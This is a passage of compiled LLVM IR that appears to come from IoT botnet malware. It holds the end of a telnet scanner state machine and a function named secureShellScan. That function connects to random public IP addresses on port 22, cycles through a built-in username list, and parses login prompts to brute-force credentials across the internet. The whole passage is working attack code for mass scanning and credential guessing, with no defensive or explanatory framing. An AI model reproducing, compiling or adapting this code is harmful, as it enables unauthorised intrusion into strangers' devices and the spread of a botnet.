  br i1 %483, label %501, label %484

; <label>:484:                                    ; preds = %477
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %485 = load i8*, i8** %357, align 8
  %486 = call i8* @strstr(i8* %485, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %487 = icmp eq i8* %486, null
  br i1 %487, label %492, label %488

; <label>:488:                                    ; preds = %484
  call void @llvm.memset.p0i8.i64(i8* %485, i8 0, i64 1024, i32 1, i1 false)
  %489 = load i32, i32* %355, align 16
  %490 = call i32 @sclose(i32 %489)
  store i8 0, i8* %36, align 8
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %491, align 1
  br label %597

; <label>:492:                                    ; preds = %484
  %493 = call i32 @matchPrompt(i8* %485)
  %494 = icmp eq i32 %493, 0
  br i1 %494, label %495, label %499

; <label>:495:                                    ; preds = %492
  call void @llvm.memset.p0i8.i64(i8* %485, i8 0, i64 1024, i32 1, i1 false)
  %496 = load i32, i32* %355, align 16
  %497 = call i32 @sclose(i32 %496)
  store i8 0, i8* %36, align 8
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %498, align 1
  br label %597

; <label>:499:                                    ; preds = %492
  store i8 7, i8* %36, align 8
  %500 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %500, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:501:                                    ; preds = %477
  %502 = load i32, i32* %355, align 16
  %503 = load i8*, i8** %357, align 8
  %504 = load i16, i16* %359, align 16
  %505 = zext i16 %504 to i32
  %506 = call i32 @readUntil(i32 %502, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %503, i32 1024, i32 %505)
  %507 = icmp eq i32 %506, 0
  br i1 %507, label %525, label %508

; <label>:508:                                    ; preds = %501
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %509 = load i8*, i8** %357, align 8
  %510 = call i8* @strstr(i8* %509, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %511 = icmp eq i8* %510, null
  br i1 %511, label %516, label %512

; <label>:512:                                    ; preds = %508
  call void @llvm.memset.p0i8.i64(i8* %509, i8 0, i64 1024, i32 1, i1 false)
  %513 = load i32, i32* %355, align 16
  %514 = call i32 @sclose(i32 %513)
  store i8 0, i8* %36, align 8
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %515, align 1
  br label %597

; <label>:516:                                    ; preds = %508
  %517 = call i32 @matchPrompt(i8* %509)
  %518 = icmp eq i32 %517, 0
  br i1 %518, label %519, label %523

; <label>:519:                                    ; preds = %516
  call void @llvm.memset.p0i8.i64(i8* %509, i8 0, i64 1024, i32 1, i1 false)
  %520 = load i32, i32* %355, align 16
  %521 = call i32 @sclose(i32 %520)
  store i8 0, i8* %36, align 8
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %522, align 1
  br label %597

; <label>:523:                                    ; preds = %516
  store i8 7, i8* %36, align 8
  %524 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %524, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:525:                                    ; preds = %501
  %526 = load i32, i32* %355, align 16
  %527 = load i8*, i8** %357, align 8
  %528 = load i16, i16* %359, align 16
  %529 = zext i16 %528 to i32
  %530 = call i32 @readUntil(i32 %526, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %527, i32 1024, i32 %529)
  %531 = icmp eq i32 %530, 0
  br i1 %531, label %549, label %532

; <label>:532:                                    ; preds = %525
  store i32 0, i32* %349, align 4
  store i16 0, i16* %359, align 16
  %533 = load i8*, i8** %357, align 8
  %534 = call i8* @strstr(i8* %533, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %535 = icmp eq i8* %534, null
  br i1 %535, label %540, label %536

; <label>:536:                                    ; preds = %532
  call void @llvm.memset.p0i8.i64(i8* %533, i8 0, i64 1024, i32 1, i1 false)
  %537 = load i32, i32* %355, align 16
  %538 = call i32 @sclose(i32 %537)
  store i8 0, i8* %36, align 8
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %539, align 1
  br label %597

; <label>:540:                                    ; preds = %532
  %541 = call i32 @matchPrompt(i8* %533)
  %542 = icmp eq i32 %541, 0
  br i1 %542, label %543, label %547

; <label>:543:                                    ; preds = %540
  call void @llvm.memset.p0i8.i64(i8* %533, i8 0, i64 1024, i32 1, i1 false)
  %544 = load i32, i32* %355, align 16
  %545 = call i32 @sclose(i32 %544)
  store i8 0, i8* %36, align 8
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %546, align 1
  br label %597

; <label>:547:                                    ; preds = %540
  store i8 7, i8* %36, align 8
  %548 = load i8*, i8** %357, align 8
  call void @llvm.memset.p0i8.i64(i8* %548, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:549:                                    ; preds = %525
  %550 = load i8*, i8** %357, align 8
  %551 = call i64 @strlen(i8* %550) #14
  %552 = trunc i64 %551 to i16
  store i16 %552, i16* %359, align 16
  %553 = load i32, i32* %349, align 4
  %554 = add i32 %553, 10
  %555 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %556 = icmp ult i32 %554, %555
  br i1 %556, label %557, label %597

; <label>:557:                                    ; preds = %549
  %558 = load i32, i32* %355, align 16
  %559 = call i32 @sclose(i32 %558)
  store i8 0, i8* %36, align 8
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %560, align 1
  br label %597

; <label>:561:                                    ; preds = %.lr.ph
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %563 = load i32, i32* %562, align 16
  %564 = call i64 @send(i32 %563, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0), i64 4, i32 16384) #3
  %565 = icmp slt i64 %564, 0
  br i1 %565, label %566, label %570

; <label>:566:                                    ; preds = %561
  %567 = load i32, i32* %562, align 16
  %568 = call i32 @sclose(i32 %567)
  store i8 0, i8* %36, align 8
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %569, align 1
  br label %597

; <label>:570:                                    ; preds = %561
  store i8 8, i8* %36, align 8
  br label %597

; <label>:571:                                    ; preds = %.lr.ph
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %573 = load i32, i32* %572, align 4
  %574 = icmp eq i32 %573, 0
  br i1 %574, label %575, label %577

; <label>:575:                                    ; preds = %571
  %576 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %576, i32* %572, align 4
  br label %577

; <label>:577:                                    ; preds = %575, %571
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %579 = load i32, i32* %578, align 16
  %580 = call i64 @send(i32 %579, i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.41, i64 0, i64 0), i64 194, i32 16384) #3
  %581 = icmp slt i64 %580, 0
  br i1 %581, label %582, label %588

; <label>:582:                                    ; preds = %577
  %583 = load i32, i32* %578, align 16
  %584 = call i32 @sclose(i32 %583)
  store i8 0, i8* %36, align 8
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %585, align 1
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %587 = load i8*, i8** %586, align 8
  call void @llvm.memset.p0i8.i64(i8* %587, i8 0, i64 1024, i32 1, i1 false)
  br label %597

; <label>:588:                                    ; preds = %577
  %589 = load i32, i32* %572, align 4
  %590 = add i32 %589, 10
  %591 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %592 = icmp ult i32 %590, %591
  br i1 %592, label %593, label %597

; <label>:593:                                    ; preds = %588
  %594 = load i32, i32* %578, align 16
  %595 = call i32 @sclose(i32 %594)
  store i8 0, i8* %36, align 8
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %596, align 1
  br label %597

; <label>:597:                                    ; preds = %.lr.ph, %225, %347, %570, %84, %81, %131, %126, %199, %191, %321, %314, %557, %549, %593, %588, %64, %582, %566, %547, %543, %536, %523, %519, %512, %499, %495, %488, %475, %471, %464, %451, %447, %440, %427, %423, %416, %403, %399, %392, %379, %375, %368, %343, %337, %310, %303, %296, %289, %282, %275, %268, %261, %253, %242, %221, %215, %189, %180, %171, %162, %151, %115, %63
  %598 = add nsw i32 %.1307, 1
  %599 = icmp slt i32 %598, %10
  %brmerge = or i1 %599, %23
  %.mux = select i1 %599, i32 %598, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %597
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @secureShellScan() local_unnamed_addr #12 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca %struct.timeval, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 @getdtablesize() #3
  %7 = sdiv i32 %6, 4
  %8 = mul nsw i32 %7, 3
  %9 = icmp slt i32 %8, 512
  %10 = select i1 %9, i32 %8, i32 512
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 22) #17
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = zext i32 %10 to i64
  %17 = alloca %struct.telstate_t, i64 %16, align 16
  %18 = bitcast %struct.telstate_t* %17 to i8*
  %19 = sext i32 %10 to i64
  %20 = mul nsw i64 %19, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 %20, i32 16, i1 false)
  %21 = icmp sgt i32 %6, 3
  br i1 %21, label %.lr.ph292.preheader, label %.preheader

.lr.ph292.preheader:                              ; preds = %0
  %22 = sext i32 %10 to i64
  br label %.lr.ph292

.preheader.loopexit:                              ; preds = %.lr.ph292
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %0
  %23 = icmp sgt i32 %6, 3
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %26 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 1
  br label %.loopexit

.lr.ph292:                                        ; preds = %.lr.ph292.preheader, %.lr.ph292
  %indvars.iv = phi i64 [ 0, %.lr.ph292.preheader ], [ %indvars.iv.next, %.lr.ph292 ]
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 3
  store i8 1, i8* %27, align 1
  %28 = tail call noalias i8* @malloc(i64 1024) #3
  %29 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 8
  store i8* %28, i8** %29, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %30 = icmp slt i64 %indvars.iv.next, %22
  br i1 %30, label %.lr.ph292, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %23, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 0
  %33 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %580
  %.1290 = phi i32 [ %.mux, %580 ], [ 0, %.lr.ph.preheader ]
  %34 = sext i32 %.1290 to i64
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 2
  %37 = load i8, i8* %36, align 8
  switch i8 %37, label %580 [
    i8 0, label %38
    i8 1, label %86
    i8 2, label %135
    i8 3, label %176
    i8 4, label %199
    i8 5, label %298
    i8 6, label %321
    i8 7, label %534
    i8 8, label %544
    i8 9, label %554
  ]

; <label>:38:                                     ; preds = %.lr.ph
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %40 = load i8*, i8** %39, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1024, i32 1, i1 false)
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  %42 = load i8, i8* %41, align 1
  %43 = icmp eq i8 %42, 0
  br i1 %43, label %50, label %44

; <label>:44:                                     ; preds = %38
  %45 = bitcast i8** %39 to i64*
  %46 = load i64, i64* %45, align 8
  %47 = bitcast %struct.telstate_t* %35 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 32, i32 16, i1 false)
  store i64 %46, i64* %45, align 8
  %48 = call i32 @getRandomPublicIP()
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  store i32 %48, i32* %49, align 4
  br label %64

; <label>:50:                                     ; preds = %38
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 5
  %52 = load i8, i8* %51, align 1
  %53 = add i8 %52, 1
  store i8 %53, i8* %51, align 1
  %54 = icmp eq i8 %53, 18
  br i1 %54, label %55, label %59

; <label>:55:                                     ; preds = %50
  store i8 0, i8* %51, align 1
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %57 = load i8, i8* %56, align 2
  %58 = add i8 %57, 1
  store i8 %58, i8* %56, align 2
  br label %59

; <label>:59:                                     ; preds = %55, %50
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %61 = load i8, i8* %60, align 2
  %62 = icmp eq i8 %61, 10
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %59
  store i8 1, i8* %41, align 1
  br label %580

; <label>:64:                                     ; preds = %59, %44
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 1
  %66 = load i32, i32* %65, align 4
  store i32 %66, i32* %24, align 4
  %67 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  store i32 %67, i32* %68, align 16
  %69 = icmp eq i32 %67, -1
  br i1 %69, label %580, label %70

; <label>:70:                                     ; preds = %64
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %67, i32 3, i8* null) #3
  %72 = or i32 %71, 2048
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %67, i32 4, i32 %72) #3
  %74 = load i32, i32* %68, align 16
  %75 = call i32 @connect(i32 %74, %struct.sockaddr* nonnull %31, i32 16) #3
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %84

; <label>:77:                                     ; preds = %70
  %78 = tail call i32* @__errno_location() #17
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %84, label %81

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %68, align 16
  %83 = call i32 @sclose(i32 %82)
  store i8 1, i8* %41, align 1
  br label %580

; <label>:84:                                     ; preds = %77, %70
  store i8 1, i8* %36, align 8
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  store i32 0, i32* %85, align 4
  br label %580

; <label>:86:                                     ; preds = %.lr.ph
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %92

; <label>:90:                                     ; preds = %86
  %91 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %91, i32* %87, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %90
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %25) #3, !srcloc !7
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %95 = load i32, i32* %94, align 16
  %96 = srem i32 %95, 64
  %97 = zext i32 %96 to i64
  %98 = shl i64 1, %97
  %99 = sdiv i32 %95, 64
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %100
  %102 = load i64, i64* %101, align 8
  %103 = or i64 %98, %102
  store i64 %103, i64* %101, align 8
  store i64 0, i64* %32, align 8
  store i64 10000, i64* %26, align 8
  %104 = load i32, i32* %94, align 16
  %105 = add nsw i32 %104, 1
  %106 = call i32 @select(i32 %105, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %2) #3
  switch i32 %106, label %126 [
    i32 1, label %107
    i32 -1, label %122
  ]

; <label>:107:                                    ; preds = %92
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %108 = load i32, i32* %94, align 16
  %109 = call i32 @getsockopt(i32 %108, i32 1, i32 4, i8* nonnull %33, i32* nonnull %3) #3
  %110 = load i32, i32* %4, align 4
  %111 = icmp eq i32 %110, 0
  %112 = load i32, i32* %94, align 16
  br i1 %111, label %115, label %113

; <label>:113:                                    ; preds = %107
  %114 = call i32 @sclose(i32 %112)
  br label %.sink.split

; <label>:115:                                    ; preds = %107
  %116 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null) #3
  %117 = and i32 %116, -2049
  %118 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 4, i32 %117) #3
  store i32 0, i32* %87, align 4
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  store i16 0, i16* %119, align 16
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %121 = load i8*, i8** %120, align 8
  call void @llvm.memset.p0i8.i64(i8* %121, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %36, align 8
  br label %580

; <label>:122:                                    ; preds = %92
  %123 = load i32, i32* %94, align 16
  %124 = call i32 @sclose(i32 %123)
  br label %.sink.split

.sink.split:                                      ; preds = %113, %122
  store i8 0, i8* %36, align 8
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %125, align 1
  br label %126

; <label>:126:                                    ; preds = %92, %.sink.split
  %127 = load i32, i32* %87, align 4
  %128 = add i32 %127, 10
  %129 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %130 = icmp ult i32 %128, %129
  br i1 %130, label %131, label %580

; <label>:131:                                    ; preds = %126
  %132 = load i32, i32* %94, align 16
  %133 = call i32 @sclose(i32 %132)
  store i8 0, i8* %36, align 8
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %134, align 1
  br label %580

; <label>:135:                                    ; preds = %.lr.ph
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %137 = load i32, i32* %136, align 4
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %141

; <label>:139:                                    ; preds = %135
  %140 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %140, i32* %136, align 4
  br label %141

; <label>:141:                                    ; preds = %139, %135
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %143 = load i32, i32* %142, align 16
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %145 = load i8*, i8** %144, align 8
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %147 = load i16, i16* %146, align 16
  %148 = zext i16 %147 to i32
  %149 = call i32 @readUntil(i32 %143, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %145, i32 1024, i32 %148)
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %155, label %151

; <label>:151:                                    ; preds = %141
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %152 = load i8*, i8** %144, align 8
  %153 = call i8* @strstr(i8* %152, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #14
  %154 = icmp ne i8* %153, null
  %.sink = select i1 %154, i8 5, i8 3
  store i8 %.sink, i8* %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %152, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:155:                                    ; preds = %141
  %156 = load i32, i32* %142, align 16
  %157 = load i8*, i8** %144, align 8
  %158 = load i16, i16* %146, align 16
  %159 = zext i16 %158 to i32
  %160 = call i32 @readUntil(i32 %156, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %157, i32 1024, i32 %159)
  %161 = icmp eq i32 %160, 0
  br i1 %161, label %164, label %162

; <label>:162:                                    ; preds = %155
  store i32 0, i32* %136, align 4
  store i16 0, i16* %146, align 16
  %163 = load i8*, i8** %144, align 8
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %36, align 8
  br label %580

; <label>:164:                                    ; preds = %155
  %165 = load i8*, i8** %144, align 8
  %166 = call i64 @strlen(i8* %165) #14
  %167 = trunc i64 %166 to i16
  store i16 %167, i16* %146, align 16
  %168 = load i32, i32* %136, align 4
  %169 = add i32 %168, 10
  %170 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %171 = icmp ult i32 %169, %170
  br i1 %171, label %172, label %580

; <label>:172:                                    ; preds = %164
  %173 = load i32, i32* %142, align 16
  %174 = call i32 @sclose(i32 %173)
  store i8 0, i8* %36, align 8
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %175, align 1
  br label %580

; <label>:176:                                    ; preds = %.lr.ph
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %178 = load i32, i32* %177, align 16
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 4
  %180 = load i8, i8* %179, align 2
  %181 = zext i8 %180 to i64
  %182 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %181
  %183 = load i8*, i8** %182, align 8
  %184 = call i64 @strlen(i8* %183) #14
  %185 = call i64 @send(i32 %178, i8* %183, i64 %184, i32 16384) #3
  %186 = icmp slt i64 %185, 0
  %187 = load i32, i32* %177, align 16
  br i1 %186, label %188, label %191

; <label>:188:                                    ; preds = %176
  %189 = call i32 @sclose(i32 %187)
  store i8 0, i8* %36, align 8
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %190, align 1
  br label %580

; <label>:191:                                    ; preds = %176
  %192 = call i64 @send(i32 %187, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %193 = icmp slt i64 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %191
  %195 = load i32, i32* %177, align 16
  %196 = call i32 @sclose(i32 %195)
  store i8 0, i8* %36, align 8
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %197, align 1
  br label %580

; <label>:198:                                    ; preds = %191
  store i8 4, i8* %36, align 8
  br label %580

; <label>:199:                                    ; preds = %.lr.ph
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %201 = load i32, i32* %200, align 4
  %202 = icmp eq i32 %201, 0
  br i1 %202, label %203, label %205

; <label>:203:                                    ; preds = %199
  %204 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %204, i32* %200, align 4
  br label %205

; <label>:205:                                    ; preds = %203, %199
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %207 = load i32, i32* %206, align 16
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %209 = load i8*, i8** %208, align 8
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %211 = load i16, i16* %210, align 16
  %212 = zext i16 %211 to i32
  %213 = call i32 @readUntil(i32 %207, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %209, i32 1024, i32 %212)
  %214 = icmp eq i32 %213, 0
  br i1 %214, label %219, label %215

; <label>:215:                                    ; preds = %205
  store i32 0, i32* %200, align 4
  store i16 0, i16* %210, align 16
  %216 = load i8*, i8** %208, align 8
  %217 = call i8* @strstr(i8* %216, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0)) #14
  %218 = icmp ne i8* %217, null
  %.sink2 = select i1 %218, i8 5, i8 7
  store i8 %.sink2, i8* %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %216, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:219:                                    ; preds = %205
  %220 = load i32, i32* %206, align 16
  %221 = load i8*, i8** %208, align 8
  %222 = load i16, i16* %210, align 16
  %223 = zext i16 %222 to i32
  %224 = call i32 @readUntil(i32 %220, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %221, i32 1024, i32 %223)
  %225 = icmp eq i32 %224, 0
  br i1 %225, label %230, label %226

; <label>:226:                                    ; preds = %219
  store i32 0, i32* %200, align 4
  store i16 0, i16* %210, align 16
  %227 = load i8*, i8** %208, align 8
  %228 = call i8* @strstr(i8* %227, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #14
  %229 = icmp ne i8* %228, null
  %.sink3 = select i1 %229, i8 5, i8 7
  store i8 %.sink3, i8* %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %227, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:230:                                    ; preds = %219
  %231 = load i8*, i8** %208, align 8
  %232 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %233 = icmp eq i8* %232, null
  br i1 %233, label %238, label %234

; <label>:234:                                    ; preds = %230
  %235 = load i32, i32* %206, align 16
  %236 = call i32 @sclose(i32 %235)
  store i8 0, i8* %36, align 8
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %237, align 1
  br label %580

; <label>:238:                                    ; preds = %230
  %239 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %240 = icmp eq i8* %239, null
  br i1 %240, label %245, label %241

; <label>:241:                                    ; preds = %238
  %242 = load i32, i32* %206, align 16
  %243 = call i32 @sclose(i32 %242)
  store i8 0, i8* %36, align 8
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %244, align 1
  br label %580

; <label>:245:                                    ; preds = %238
  %246 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %247 = icmp eq i8* %246, null
  br i1 %247, label %252, label %248

; <label>:248:                                    ; preds = %245
  %249 = load i32, i32* %206, align 16
  %250 = call i32 @sclose(i32 %249)
  store i8 0, i8* %36, align 8
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %251, align 1
  br label %580

; <label>:252:                                    ; preds = %245
